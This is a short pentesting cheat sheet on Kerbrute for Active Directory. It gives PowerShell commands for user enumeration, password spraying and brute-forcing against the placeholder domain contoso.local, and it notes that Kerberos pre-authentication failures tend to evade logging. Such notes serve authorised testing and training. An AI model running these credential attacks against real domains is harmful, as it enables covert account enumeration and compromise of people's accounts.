**We Have No User for such testing**
[Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the jsmith.txt or jsmith2.txt user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users.
## Common Windows Usage Examples

1. **User Enumeration**
    
    ```powershell
    .\kerbrute.exe userenum -d contoso.local --dc dc01.contoso.local users.txt
    ```
    
    Enumerates valid accounts listed in `users.txt` against the specified DC .
    
2. **Password Spray**
    
    ```powershell
    .\kerbrute.exe passwordspray -d contoso.local domain_users.txt P@ssw0rd!
    ```
    
    Tests the single password `P@ssw0rd!` against all usernames in `domain_users.txt` .
    
3. **Brute‑Force Single User**
    
    ```powershell
    .\kerbrute.exe bruteuser -d contoso.local passlist.txt alice
    ```
    
    Runs a traditional wordlist attack against `alice` using `passlist.txt` .
    
4. **Brute‑Force Username:Password Combos**
    
    ```powershell
    Get-Content combos.lst | .\kerbrute.exe bruteforce -d contoso.local -
    ```
    
    Pipes `username:password` lines from `combos.lst` into Kerbrute for testing.
    
